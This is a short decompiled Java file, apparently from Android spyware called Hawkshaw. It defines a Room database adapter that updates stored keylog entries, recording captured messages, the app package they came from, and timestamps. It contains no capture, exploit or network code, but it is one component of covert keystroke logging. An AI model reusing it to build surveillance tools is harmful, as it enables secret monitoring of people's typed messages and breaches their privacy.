package com.hawkshaw.library.datalayer.room.keylogger;

import V.h;
import androidx.room.A;
import androidx.room.i;

public final class d extends i {

    /* renamed from: d  reason: collision with root package name */
    public final /* synthetic */ KeyLoggerDao_Impl f4944d;

    /* JADX INFO: super call moved to the top of the method (can break code semantics) */
    public d(KeyLoggerDao_Impl keyLoggerDao_Impl, A a5) {
        super(a5);
        this.f4944d = keyLoggerDao_Impl;
    }

    public final String b() {
        return "UPDATE OR IGNORE `KeyLogEntity` SET `type` = ?,`message` = ?,`package_name` = ?,`timestamp` = ?,`id` = ? WHERE `id` = ?";
    }

    public final void d(h hVar, Object obj) {
        KeyLogEntity keyLogEntity = (KeyLogEntity) obj;
        hVar.I(1, this.f4944d.__Type_enumToString(keyLogEntity.getType()));
        hVar.I(2, keyLogEntity.getMessage());
        hVar.I(3, keyLogEntity.getPackageName());
        hVar.L(4, keyLogEntity.getTimestamp());
        hVar.L(5, (long) keyLogEntity.getId());
        hVar.L(6, (long) keyLogEntity.getId());
    }
}
